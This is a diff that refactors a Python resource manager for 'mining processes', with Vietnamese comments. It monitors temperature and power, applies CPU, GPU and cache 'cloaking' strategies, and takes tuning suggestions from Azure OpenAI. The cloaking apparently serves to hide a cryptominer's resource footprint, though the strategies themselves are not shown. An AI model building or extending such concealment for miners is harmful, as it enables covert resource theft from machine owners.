+                gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)
 
-                for process in self.mining_processes:
-                    self.check_temperature_and_enqueue(process, cpu_max_temp, gpu_max_temp)
+                for proc in self.mining_processes:
+                    self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)
 
                 power_limits = self.config.get("power_limits", {})
-                per_device_power = power_limits.get("per_device_power_watts", {})
+                per_dev_power = power_limits.get("per_device_power_watts", {})
 
-                # Bảo vệ giá trị để tránh lỗi so sánh dict với dict
-                cpu_max_power = per_device_power.get("cpu", 150)
-                if not isinstance(cpu_max_power, (int, float)):
-                    self.logger.warning(
-                        f"Giá trị cpu_max_power không hợp lệ: {cpu_max_power}. Sử dụng giá trị mặc định 150W."
-                    )
-                    cpu_max_power = 150
+                # Tránh so sánh dict
+                cpu_max_pwr = per_dev_power.get("cpu", 150)
+                if not isinstance(cpu_max_pwr, (int, float)):
+                    self.logger.warning(f"cpu_max_power không hợp lệ: {cpu_max_pwr}, default=150W")
+                    cpu_max_pwr = 150
 
-                gpu_max_power = per_device_power.get("gpu", 300)
-                if not isinstance(gpu_max_power, (int, float)):
-                    self.logger.warning(
-                        f"Giá trị gpu_max_power không hợp lệ: {gpu_max_power}. Sử dụng giá trị mặc định 300W."
-                    )
-                    gpu_max_power = 300
+                gpu_max_pwr = per_dev_power.get("gpu", 300)
+                if not isinstance(gpu_max_pwr, (int, float)):
+                    self.logger.warning(f"gpu_max_power không hợp lệ: {gpu_max_pwr}, default=300W")
+                    gpu_max_pwr = 300
 
-                for process in self.mining_processes:
-                    self.check_power_and_enqueue(process, cpu_max_power, gpu_max_power)
+                for proc in self.mining_processes:
+                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)
 
                 if self.should_collect_azure_monitor_data():
                     self.collect_azure_monitor_data()
 
             except Exception as e:
-                self.logger.error(f"Lỗi trong quá trình theo dõi và điều chỉnh: {e}")
+                self.logger.error(f"Lỗi monitor_and_adjust: {e}")
 
-            sleep(max(temperature_check_interval, power_check_interval))
+            sleep(max(temp_intv, power_intv))
 
     def gather_metric_data_for_anomaly_detection(self) -> Dict[str, Any]:
         """
-        Thu thập dữ liệu metric để phát hiện bất thường.
+        Thu thập metric để anomaly_detector sử dụng.
         """
         data = {}
         with self.mining_processes_lock.gen_rlock():
-            for process in self.mining_processes:
+            for proc in self.mining_processes:
                 try:
-                    proc = psutil.Process(process.pid)
-                    
-                    # Thu thập từng metric và đảm bảo giá trị hợp lệ
-                    cpu_usage = proc.cpu_percent(interval=None)
-                    ram_usage_mb = proc.memory_info().rss / (1024 * 1024)
-                    gpu_usage_percent = (
-                        temperature_monitor.get_current_gpu_usage(process.pid)
-                        if self.shared_resource_manager.is_gpu_initialized()
-                        else 0
-                    )
-                    disk_io_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
-                    network_bandwidth_mbps = self.config.get('resource_allocation', {}).get(
-                        'network', {}
-                    ).get('bandwidth_limit_mbps', 100)
-                    cache_limit_percent = self.config.get('resource_allocation', {}).get(
-                        'cache', {}
-                    ).get('limit_percent', 50)
+                    p_obj = psutil.Process(proc.pid)
+                    cpu_usage = p_obj.cpu_percent(interval=None)
+                    ram_mb = p_obj.memory_info().rss / (1024 * 1024)
+                    if self.shared_resource_manager.is_gpu_initialized():
+                        gpu_usage_percent = temperature_monitor.get_current_gpu_usage(proc.pid)
+                    else:
+                        gpu_usage_percent = 0
+                    disk_io_mbps = temperature_monitor.get_current_disk_io_limit(proc.pid)
 
-                    # Kiểm tra và loại bỏ giá trị không hợp lệ (đặc biệt là dict)
-                    def validate_metric(value, field_name):
-                        if isinstance(value, dict):
-                            self.logger.warning(
-                                f"Metric data cho PID {process.pid}, field '{field_name}' không phải giá trị hợp lệ, bỏ qua."
-                            )
+                    net_bw = (self.config.get('resource_allocation', {})
+                                       .get('network', {})
+                                       .get('bandwidth_limit_mbps', 100))
+                    cache_lim = (self.config.get('resource_allocation', {})
+                                       .get('cache', {})
+                                       .get('limit_percent', 50))
+
+                    def validate(v, field):
+                        if isinstance(v, dict):
+                            self.logger.warning(f"PID {proc.pid}, field='{field}' là dict => bỏ qua.")
                             return None
-                        return value
+                        return v
 
-                    data[process.pid] = {
-                        'cpu_usage': validate_metric(cpu_usage, 'cpu_usage'),
-                        'ram_usage_mb': validate_metric(ram_usage_mb, 'ram_usage_mb'),
-                        'gpu_usage_percent': validate_metric(gpu_usage_percent, 'gpu_usage_percent'),
-                        'disk_io_mbps': validate_metric(disk_io_mbps, 'disk_io_mbps'),
-                        'network_bandwidth_mbps': validate_metric(network_bandwidth_mbps, 'network_bandwidth_mbps'),
-                        'cache_limit_percent': validate_metric(cache_limit_percent, 'cache_limit_percent'),
+                    data[proc.pid] = {
+                        'cpu_usage': validate(cpu_usage, 'cpu_usage'),
+                        'ram_usage_mb': validate(ram_mb, 'ram_usage_mb'),
+                        'gpu_usage_percent': validate(gpu_usage_percent, 'gpu_usage_percent'),
+                        'disk_io_mbps': validate(disk_io_mbps, 'disk_io_mbps'),
+                        'network_bandwidth_mbps': validate(net_bw, 'network_bandwidth_mbps'),
+                        'cache_limit_percent': validate(cache_lim, 'cache_limit_percent'),
                     }
 
-                    # Xóa các trường có giá trị None để tránh ảnh hưởng đến downstream processing
-                    data[process.pid] = {
-                        k: v for k, v in data[process.pid].items() if v is not None
-                    }
+                    data[proc.pid] = {k: v for k, v in data[proc.pid].items() if v is not None}
 
                 except psutil.NoSuchProcess:
-                    self.logger.warning(
-                        f"Tiến trình PID {process.pid} không còn tồn tại."
-                    )
+                    self.logger.warning(f"Tiến trình PID {proc.pid} không còn tồn tại.")
                 except Exception as e:
-                    self.logger.error(
-                        f"Lỗi khi thu thập dữ liệu cho PID {process.pid}: {e}"
-                    )
+                    self.logger.error(f"Lỗi gather_metric_data cho PID {proc.pid}: {e}")
         return data
 
     def allocate_resources_with_priority(self):
         """
-        Phân bổ tài nguyên cho các tiến trình theo thứ tự ưu tiên.
+        Phân bổ tài nguyên (CPU threads) theo priority.
         """
         with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
-            # Sử dụng danh sách đã lọc và sửa lỗi priority nếu cần
-            filtered_processes = []
-            for process in self.mining_processes:
-                if not isinstance(process.priority, int):
-                    self.logger.warning(
-                        f"Priority của tiến trình {process.name} (PID: {process.pid}) không hợp lệ. Sử dụng giá trị mặc định là 1."
-                    )
-                    process.priority = 1  # Gán giá trị mặc định nếu không hợp lệ
-                filtered_processes.append(process)
+            flt_procs = []
+            for p in self.mining_processes:
+                if not isinstance(p.priority, int):
+                    self.logger.warning(f"Priority {p.priority} invalid, gán=1.")
+                    p.priority = 1
+                flt_procs.append(p)
 
-            # Sắp xếp các tiến trình
-            sorted_processes = sorted(
-                filtered_processes,
-                key=lambda p: p.priority,
-                reverse=True
-            )
+            s_procs = sorted(flt_procs, key=lambda x: x.priority, reverse=True)
             
-            total_cpu_cores = psutil.cpu_count(logical=True)
-            allocated_cores = 0
+            total_cores = psutil.cpu_count(logical=True)
+            allocated = 0
 
-            for process in sorted_processes:
-                if allocated_cores >= total_cpu_cores:
+            for p in s_procs:
+                if allocated >= total_cores:
                     self.logger.warning(
-                        f"Không còn lõi CPU để phân bổ cho tiến trình {process.name} (PID: {process.pid})."
+                        f"Không còn CPU core cho {p.name} (PID: {p.pid})."
                     )
                     continue
 
-                available_cores = total_cpu_cores - allocated_cores
-                cores_to_allocate = min(process.priority, available_cores)
-                cpu_threads = cores_to_allocate
-
+                avb = total_cores - allocated
+                needed = min(p.priority, avb)
                 adjustment_task = {
                     'function': 'adjust_cpu_threads',
-                    'args': (process.pid, cpu_threads, process.name)
+                    'args': (p.pid, needed, p.name)
                 }
                 self.resource_adjustment_queue.put((3, adjustment_task))
-                allocated_cores += cores_to_allocate
+                allocated += needed
 
-    def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
+    def check_temperature_and_enqueue(self, process: MiningProcess,
+                                      cpu_max_temp: int, gpu_max_temp: int):
         try:
             cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
-            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid) \
-                if self.shared_resource_manager.is_gpu_initialized() else 0
+            gpu_temp = 0
+            if self.shared_resource_manager.is_gpu_initialized():
+                g_vals = temperature_monitor.get_gpu_temperature(process.pid)
+                if isinstance(g_vals, list) and g_vals:
+                    gpu_temp = max(g_vals)
 
-            if cpu_temp > cpu_max_temp or gpu_temp > gpu_max_temp:
+            if (cpu_temp and cpu_temp > cpu_max_temp) or (gpu_temp and gpu_temp > gpu_max_temp):
                 adjustments = {}
-                if cpu_temp > cpu_max_temp:
+                if cpu_temp and cpu_temp > cpu_max_temp:
                     self.logger.warning(
-                        f"Nhiệt độ CPU {cpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_temp}°C.")
+                        f"CPU temp={cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid})."
+                    )
                     adjustments['cpu_cloak'] = True
-                if gpu_temp > gpu_max_temp:
+                if gpu_temp and gpu_temp > gpu_max_temp:
                     self.logger.warning(
-                        f"Nhiệt độ GPU {gpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_temp}°C.")
+                        f"GPU temp={gpu_temp}°C > {gpu_max_temp}°C (PID={process.pid})."
+                    )
                     adjustments['gpu_cloak'] = True
 
-                adjustment_task = {
+                task = {
                     'type': 'monitoring',
                     'process': process,
                     'adjustments': adjustments
                 }
-                self.resource_adjustment_queue.put((2, adjustment_task))
+                self.resource_adjustment_queue.put((2, task))
         except Exception as e:
-            self.logger.error(
-                f"Lỗi khi kiểm tra nhiệt độ cho tiến trình {process.name} (PID: {process.pid}): {e}")
+            self.logger.error(f"check_temperature_and_enqueue error: {e}")
 
-    def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
+    def check_power_and_enqueue(self, process: MiningProcess,
+                                cpu_max_power: int, gpu_max_power: int):
         try:
-            cpu_power = get_cpu_power(process.pid)
-            gpu_power = get_gpu_power(process.pid) \
-                if self.shared_resource_manager.is_gpu_initialized() else 0
+            c_power = get_cpu_power(process.pid)
+            g_power = 0
+            if self.shared_resource_manager.is_gpu_initialized():
+                g_vals = get_gpu_power(process.pid)
+                if isinstance(g_vals, list) and g_vals:
+                    g_power = max(g_vals)
 
-            if cpu_power > cpu_max_power or gpu_power > gpu_max_power:
-                adjustments = {}
-                if cpu_power > cpu_max_power:
+            if (c_power and c_power > cpu_max_power) or (g_power and g_power > gpu_max_power):
+                adj = {}
+                if c_power and c_power > cpu_max_power:
                     self.logger.warning(
-                        f"Công suất CPU {cpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_power}W.")
-                    adjustments['cpu_cloak'] = True
-                if gpu_power > gpu_max_power:
+                        f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid})."
+                    )
+                    adj['cpu_cloak'] = True
+                if g_power and g_power > gpu_max_power:
                     self.logger.warning(
-                        f"Công suất GPU {gpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_power}W.")
-                    adjustments['gpu_cloak'] = True
+                        f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid})."
+                    )
+                    adj['gpu_cloak'] = True
 
-                adjustment_task = {
+                t = {
                     'type': 'monitoring',
                     'process': process,
-                    'adjustments': adjustments
+                    'adjustments': adj
                 }
-                self.resource_adjustment_queue.put((2, adjustment_task))
+                self.resource_adjustment_queue.put((2, t))
         except Exception as e:
-            self.logger.error(
-                f"Lỗi khi kiểm tra công suất cho tiến trình {process.name} (PID: {process.pid}): {e}")
+            self.logger.error(f"check_power_and_enqueue error: {e}")
 
     def should_collect_azure_monitor_data(self) -> bool:
         if not hasattr(self, '_last_azure_monitor_time'):
             self._last_azure_monitor_time = 0
-        current_time = int(time())
-        interval = self.config["monitoring_parameters"].get("azure_monitor_interval_seconds", 300)
-        if current_time - self._last_azure_monitor_time >= interval:
-            self._last_azure_monitor_time = current_time
+        now = int(time())
+        interval = self.config.get("monitoring_parameters", {}).get("azure_monitor_interval_seconds", 300)
+        if now - self._last_azure_monitor_time >= interval:
+            self._last_azure_monitor_time = now
             return True
         return False
 
     def collect_azure_monitor_data(self):
         try:
             for vm in self.vms:
-                resource_id = vm['id']
+                rid = vm['id']
                 metric_names = ['Percentage CPU', 'Available Memory Bytes']
-                metrics = self.azure_monitor_client.get_metrics(resource_id, metric_names)
-                self.logger.info(
-                    f"Thu thập chỉ số từ Azure Monitor cho VM {vm['name']}: {metrics}")
+                metrics = self.azure_monitor_client.get_metrics(rid, metric_names)
+                self.logger.info(f"Thu thập chỉ số từ Azure Monitor cho VM {vm['name']}: {metrics}")
         except Exception as e:
-            self.logger.error(f"Lỗi khi thu thập dữ liệu Azure Monitor: {e}")
+            self.logger.error(f"Lỗi collect_azure_monitor_data: {e}")
 
     def optimize_resources(self):
-        optimization_interval = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
+        opt_intv = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
         while not self.stop_event.is_set():
             try:
                 with self.mining_processes_lock.gen_rlock():
-                    for process in self.mining_processes:
-                        process.update_resource_usage()
+                    for proc in self.mining_processes:
+                        proc.update_resource_usage()
 
                 self.allocate_resources_with_priority()
 
                 with self.mining_processes_lock.gen_rlock():
-                    for process in self.mining_processes:
-                        current_state = self.collect_metrics(process)
+                    for proc in self.mining_processes:
+                        current_state = self.collect_metrics(proc)
                         openai_suggestions = self.azure_openai_client.get_optimization_suggestions(current_state)
-
                         if not openai_suggestions:
                             self.logger.warning(
-                                f"Không nhận được gợi ý từ Azure OpenAI cho tiến trình {process.name} (PID: {process.pid})."
+                                f"Không có gợi ý OpenAI cho {proc.name} (PID={proc.pid})."
                             )
                             continue
-
-                        recommended_action = openai_suggestions
                         self.logger.debug(
-                            f"Hành động tối ưu (Azure OpenAI) cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}")
-
-                        adjustment_task = {
+                            f"OpenAI suggestions={openai_suggestions} cho PID={proc.pid}"
+                        )
+                        task = {
                             'type': 'optimization',
-                            'process': process,
-                            'action': recommended_action
+                            'process': proc,
+                            'action': openai_suggestions
                         }
-                        self.resource_adjustment_queue.put((2, adjustment_task))
+                        self.resource_adjustment_queue.put((2, task))
             except Exception as e:
-                self.logger.error(f"Lỗi trong quá trình tối ưu hóa tài nguyên: {e}")
+                self.logger.error(f"optimize_resources error: {e}")
 
-            sleep(optimization_interval)
+            sleep(opt_intv)
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
-        metrics = {
-            'cpu_usage_percent': psutil.Process(process.pid).cpu_percent(interval=1),
-            'memory_usage_mb': psutil.Process(process.pid).memory_info().rss / (1024 * 1024),
-            'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid)
-            if self.shared_resource_manager.is_gpu_initialized() else 0,
-            'disk_io_mbps': temperature_monitor.get_current_disk_io_limit(process.pid),
-            'network_bandwidth_mbps': self.config.get('resource_allocation', {}) \
-                .get('network', {}).get('bandwidth_limit_mbps', 100),
-            'cache_limit_percent': self.config.get('resource_allocation', {}) \
-                .get('cache', {}).get('limit_percent', 50)
+        """
+        Thu thập metric cho 1 process.
+        """
+        p_obj = psutil.Process(process.pid)
+        cpu_pct = p_obj.cpu_percent(interval=1)
+        mem_mb = p_obj.memory_info().rss / (1024**2)
+        if self.shared_resource_manager.is_gpu_initialized():
+            gpu_pct = temperature_monitor.get_current_gpu_usage(process.pid)
+        else:
+            gpu_pct = 0
+        disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
+
+        net_bw = (self.config.get('resource_allocation', {})
+                         .get('network', {})
+                         .get('bandwidth_limit_mbps', 100))
+        cache_l = (self.config.get('resource_allocation', {})
+                         .get('cache', {})
+                         .get('limit_percent', 50))
+
+        return {
+            'cpu_usage_percent': cpu_pct,
+            'memory_usage_mb': mem_mb,
+            'gpu_usage_percent': gpu_pct,
+            'disk_io_mbps': disk_mbps,
+            'network_bandwidth_mbps': net_bw,
+            'cache_limit_percent': cache_l
         }
-        return metrics
 
     def process_cloaking_requests(self):
+        """
+        Thread lấy item từ cloaking_request_queue và chuyển sang resource_adjustment_queue.
+        """
         while not self.stop_event.is_set():
             try:
                 process = self.cloaking_request_queue.get(timeout=1)
@@ -817,65 +877,65 @@ class ResourceManager(BaseManager):
             except Empty:
                 pass
             except Exception as e:
-                self.logger.error(
-                    f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}")
+                self.logger.error(f"Lỗi process_cloaking_requests: {e}")
 
     def resource_adjustment_handler(self):
+        """
+        Thread lấy item từ resource_adjustment_queue, xử lý, gọi task_done() đúng 1 lần.
+        """
         while not self.stop_event.is_set():
             try:
-                # Lấy mục từ hàng đợi
                 priority, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
                 task_id = hash(str(adjustment_task))
 
-                # Nếu nhiệm vụ đã xử lý, bỏ qua
                 if task_id in self.processed_tasks:
                     self.logger.warning(f"Nhiệm vụ đã xử lý: {adjustment_task}")
-                    # Đã gỡ bỏ lệnh task_done() ở đây để tránh double-calls
+                    # *KHÔNG* gọi task_done() ở đây
                     continue
 
-                # Xử lý nhiệm vụ
                 try:
                     self.execute_adjustment_task(adjustment_task)
                 except Exception as task_error:
-                    self.logger.error(f"Lỗi khi thực thi nhiệm vụ: {adjustment_task}, lỗi: {task_error}")
+                    self.logger.error(f"Lỗi execute_adjustment_task: {task_error}")
                 finally:
-                    # Chỉ gọi task_done() một lần duy nhất cho mỗi item
+                    # Gọi task_done() *chính xác 1 lần*
+                    # (Thêm log debug nếu cần)
+                    # self.logger.debug(f"task_done() cho {adjustment_task}")
                     self.resource_adjustment_queue.task_done()
 
-                # Ghi nhận nhiệm vụ đã xử lý
                 self.processed_tasks.add(task_id)
 
             except Empty:
-                continue
+                pass
             except Exception as e:
-                self.logger.error(f"Lỗi trong quá trình xử lý điều chỉnh tài nguyên: {e}")
+                self.logger.error(f"Lỗi resource_adjustment_handler: {e}")
 
     def execute_adjustment_task(self, adjustment_task):
         """
-        Thực thi nhiệm vụ điều chỉnh tài nguyên.
+        Thực thi nhiệm vụ điều chỉnh tài nguyên (monitoring, optimization, cloaking...).
         """
         try:
             task_type = adjustment_task.get('type')
             if task_type is None:
-                # Nếu không có loại nhiệm vụ, gọi hàm từ shared_resource_manager
-                function_name = adjustment_task['function']
+                # Hàm shared_resource_manager
+                func_name = adjustment_task['function']
                 args = adjustment_task.get('args', ())
                 kwargs = adjustment_task.get('kwargs', {})
-                function = getattr(self.shared_resource_manager, function_name, None)
-                if function:
-                    function(*args, **kwargs)
+                func = getattr(self.shared_resource_manager, func_name, None)
+                if func:
+                    func(*args, **kwargs)
                 else:
-                    self.logger.error(
-                        f"Không tìm thấy hàm điều chỉnh tài nguyên: {function_name}")
+                    self.logger.error(f"Hàm {func_name} không tìm thấy.")
             else:
-                # Xử lý các loại nhiệm vụ đặc biệt
                 process = adjustment_task['process']
                 if task_type == 'cloaking':
+                    # Áp dụng cloaking strategy
                     strategies = adjustment_task['strategies']
-                    for strategy in strategies:
-                        self.shared_resource_manager.apply_cloak_strategy(strategy, process)
+                    for st in strategies:
+                        self.shared_resource_manager.apply_cloak_strategy(st, process)
                     self.logger.info(
-                        f"Hoàn thành cloaking cho tiến trình {process.name} (PID: {process.pid}).")
+                        f"Hoàn thành cloaking cho {process.name} (PID={process.pid})."
+                    )
                 elif task_type == 'optimization':
                     action = adjustment_task['action']
                     self.apply_recommended_action(action, process)
@@ -885,14 +945,20 @@ class ResourceManager(BaseManager):
                 elif task_type == 'restore':
                     self.shared_resource_manager.restore_resources(process)
                     self.logger.info(
-                        f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
+                        f"Đã khôi phục resources cho {process.name} (PID={process.pid})."
+                    )
                 else:
                     self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi trong quá trình thực thi nhiệm vụ: {adjustment_task}. Chi tiết: {e}")
+                f"Lỗi execute_adjustment_task={adjustment_task}, chi tiết: {e}"
+            )
 
     def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
+        """
+        Áp dụng cloaking khi CPU/GPU temp/power quá cao, 
+        hoặc throttle CPU khi có 'throttle_cpu'.
+        """
         try:
             if adjustments.get('cpu_cloak'):
                 self.shared_resource_manager.apply_cloak_strategy('cpu', process)
@@ -901,87 +967,96 @@ class ResourceManager(BaseManager):
             if adjustments.get('throttle_cpu'):
                 load_percent = psutil.cpu_percent(interval=1)
                 self.shared_resource_manager.throttle_cpu_based_on_load(process, load_percent)
+
             self.logger.info(
-                f"Áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}).")
+                f"Áp dụng điều chỉnh monitor cho {process.name} (PID={process.pid})."
+            )
         except Exception as e:
-            self.logger.error(
-                f"Lỗi khi áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}): {e}")
+            self.logger.error(f"apply_monitoring_adjustments error: {e}")
 
     def apply_recommended_action(self, action: List[Any], process: MiningProcess):
+        """
+        Áp dụng gợi ý từ Azure OpenAI => push tasks vào resource_adjustment_queue.
+        """
         try:
             cpu_threads = int(action[0])
-            ram_allocation_mb = int(action[1])
+            ram_alloc = int(action[1])
 
-            gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
+            gpu_config = (self.config.get("resource_allocation", {})
+                                  .get("gpu", {})
+                                  .get("max_usage_percent", []))
 
             gpu_usage_percent = []
             if isinstance(gpu_config, list):
                 length_needed = len(gpu_config)
                 gpu_usage_percent = list(action[2:2 + length_needed])
-                next_index = 2 + length_needed
+                next_idx = 2 + length_needed
             elif isinstance(gpu_config, (int, float)):
                 gpu_usage_percent = [float(action[2])]
-                next_index = 3
+                next_idx = 3
             else:
-                self.logger.warning("max_usage_percent không phải list/int/float; bỏ qua điều chỉnh GPU.")
-                next_index = 2
+                self.logger.warning("max_usage_percent không phải list/int/float => bỏ qua GPU")
+                next_idx = 2
 
-            disk_io_limit_mbps = float(action[next_index])
-            network_bandwidth_limit_mbps = float(action[next_index + 1])
-            cache_limit_percent = float(action[next_index + 2])
+            disk_io_limit_mbps = float(action[next_idx])
+            net_bw_limit_mbps = float(action[next_idx + 1])
+            cache_limit_percent = float(action[next_idx + 2])
 
-            # Điều chỉnh CPU
-            adjustment_task = {
+            # Tạo tasks
+            # 1) CPU threads
+            t1 = {
                 'function': 'adjust_cpu_threads',
                 'args': (process.pid, cpu_threads, process.name)
             }
-            self.resource_adjustment_queue.put((3, adjustment_task))
+            self.resource_adjustment_queue.put((3, t1))
 
-            # Điều chỉnh RAM
-            adjustment_task = {
+            # 2) RAM
+            t2 = {
                 'function': 'adjust_ram_allocation',
-                'args': (process.pid, ram_allocation_mb, process.name)
+                'args': (process.pid, ram_alloc, process.name)
             }
-            self.resource_adjustment_queue.put((3, adjustment_task))
+            self.resource_adjustment_queue.put((3, t2))
 
-            # Điều chỉnh GPU usage
+            # 3) GPU usage
             if gpu_usage_percent:
-                adjustment_task = {
+                t3 = {
                     'function': 'adjust_gpu_usage',
                     'args': (process, gpu_usage_percent)
                 }
-                self.resource_adjustment_queue.put((3, adjustment_task))
+                self.resource_adjustment_queue.put((3, t3))
             else:
                 self.logger.warning(
-                    f"Không có thông tin GPU usage để điều chỉnh cho tiến trình {process.name} (PID: {process.pid})."
+                    f"Chưa có GPU usage => bỏ qua GPU cho PID={process.pid}"
                 )
 
-            # Điều chỉnh Disk I/O
-            adjustment_task = {
+            # 4) Disk I/O
+            t4 = {
                 'function': 'adjust_disk_io_limit',
                 'args': (process, disk_io_limit_mbps)
             }
-            self.resource_adjustment_queue.put((3, adjustment_task))
+            self.resource_adjustment_queue.put((3, t4))
 
-            # Điều chỉnh Network
-            adjustment_task = {
+            # 5) Network
+            t5 = {
                 'function': 'adjust_network_bandwidth',
-                'args': (process, network_bandwidth_limit_mbps)
+                'args': (process, net_bw_limit_mbps)
             }
-            self.resource_adjustment_queue.put((3, adjustment_task))
+            self.resource_adjustment_queue.put((3, t5))
 
-            # Cloak chiến lược cache
+            # 6) Cloak cache
             self.shared_resource_manager.apply_cloak_strategy('cache', process)
 
             self.logger.info(
-                f"Áp dụng thành công các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}).")
+                f"Đã áp dụng các điều chỉnh tài nguyên từ OpenAI cho {process.name} (PID={process.pid})."
+            )
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi áp dụng các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                f"Lỗi apply_recommended_action cho {process.name} (PID={process.pid}): {e}"
+            )
 
     def shutdown_power_management(self):
         try:
             shutdown_power_management()
-            self.logger.info("Đóng các dịch vụ quản lý công suất thành công.")
+            self.logger.info("Đã tắt power_management.")
         except Exception as e:
-            self.logger.error(f"Lỗi khi đóng các dịch vụ quản lý công suất: {e}")
+            self.logger.error(f"Lỗi shutdown_power_management: {e}")
